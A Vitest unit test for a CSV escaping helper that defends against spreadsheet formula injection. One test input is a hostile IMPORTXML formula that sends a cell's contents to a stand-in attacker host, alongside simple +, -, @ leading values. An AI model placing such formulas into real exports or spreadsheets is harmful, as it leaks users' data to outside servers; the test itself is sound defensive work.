import { describe, expect, it } from "vitest";

import { escapeCsvField } from "../lib/csv-helpers";

describe("script CSV helpers", () => {
  it("neutralizes formula-leading spreadsheet cells before CSV quoting", () => {
    expect(escapeCsvField('=IMPORTXML("https://attacker.example/?q="&A1)')).toBe(
      '"\'=IMPORTXML(""https://attacker.example/?q=""&A1)"',
    );
    expect(escapeCsvField("+malicious")).toBe("'+malicious");
    expect(escapeCsvField("-malicious")).toBe("'-malicious");
    expect(escapeCsvField("@malicious")).toBe("'@malicious");
    expect(escapeCsvField("  @malicious")).toBe("'  @malicious");
  });

  it("keeps normal CSV quoting behavior", () => {
    expect(escapeCsvField("USD Coin")).toBe("USD Coin");
    expect(escapeCsvField('quoted, "value"')).toBe('"quoted, ""value"""');
    expect(escapeCsvField(null)).toBe("");
  });
});
